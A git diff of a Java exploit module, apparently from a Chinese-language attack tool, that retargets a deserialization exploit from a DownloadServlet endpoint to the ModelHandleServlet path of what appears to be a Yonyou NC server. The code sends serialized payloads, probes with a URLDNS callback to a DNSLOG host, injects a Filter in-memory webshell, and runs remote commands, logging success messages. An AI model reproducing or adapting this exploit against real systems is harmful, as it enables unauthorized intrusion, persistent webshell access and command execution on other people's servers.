@@ -17,7 +17,7 @@ import java.io.ObjectOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class DownloadServlet extends VulnBase {
+public class ModelHandleServlet_Unserialize extends VulnBase {
     public static boolean DNSLOG = true;
     public static boolean JNDI = false;
     public static boolean EXEC = true;
@@ -26,16 +26,16 @@ public class DownloadServlet extends VulnBase {
 
     private String flag = "yyds";
 
-    public DownloadServlet() {
+    public ModelHandleServlet_Unserialize() {
     }
 
-    public DownloadServlet(TextArea log, TextArea uploadLog, TextArea execLog) {
+    public ModelHandleServlet_Unserialize(TextArea log, TextArea uploadLog, TextArea execLog) {
         super(log, uploadLog, execLog);
     }
 
     @Override
     public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
-        String vulnerable_url = Config.TARGET + "/servlet/~ic/nc.document.pub.fileSystem.servlet.DownloadServlet";
+        String vulnerable_url = Config.TARGET + "/servlet/~aert/uap.pub.ae.model.handle.ModelHandleServlet";
 
         try {
             if (Config.MOD.equals("poc")) {
@@ -69,7 +69,7 @@ public class DownloadServlet extends VulnBase {
             SSLUtil.trustAllCertificates();
 
             // 发送请求
-            byte[] postData = Util.getSerializedData(URLDNS.getObject("DownloadServlet." + Config.DNSLOG));
+            byte[] postData = Util.getSerializedData(URLDNS.getObject("ModelHandleServlet." + Config.DNSLOG));
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
@@ -83,12 +83,12 @@ public class DownloadServlet extends VulnBase {
 
             int responseCode = HttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                logMessage("[+] DownloadServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
+                logMessage("[+] ModelHandleServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
             } else {
-                logMessage("[-] DownloadServlet 反序列化探测失败, 状态码: " + responseCode);
+                logMessage("[-] ModelHandleServlet 反序列化探测失败, 状态码: " + responseCode);
             }
         } catch (Exception e) {
-            logMessage("[-] DownloadServlet 反序列化探测失败, 请尝试手动探测. " + e);
+            logMessage("[-] ModelHandleServlet 反序列化探测失败, 请尝试手动探测. " + e);
         }
     }
 
@@ -120,11 +120,11 @@ public class DownloadServlet extends VulnBase {
                 logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
                 return;
             } else {
-                logMessage("[-] DownloadServlet 反序列化利用失败, 状态码: " + responseCode);
+                logMessage("[-] ModelHandleServlet 反序列化利用失败, 状态码: " + responseCode);
                 return;
             }
         } catch (Exception e) {
-            logMessage("[-] DownloadServlet 反序列化利用失败, 请尝试手动利用. " + e);
+            logMessage("[-] ModelHandleServlet 反序列化利用失败, 请尝试手动利用. " + e);
             return;
         }
     }
@@ -158,7 +158,7 @@ public class DownloadServlet extends VulnBase {
             int responseCode = HttpUtil.getResponseCode(exec_conn);
             String responseText = HttpUtil.getResponseText(exec_conn);
             if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
-                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 1));
+                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 74));
                 return;
             } else {
                 logExec("[-] 命令执行失败. 请尝试手动利用.");
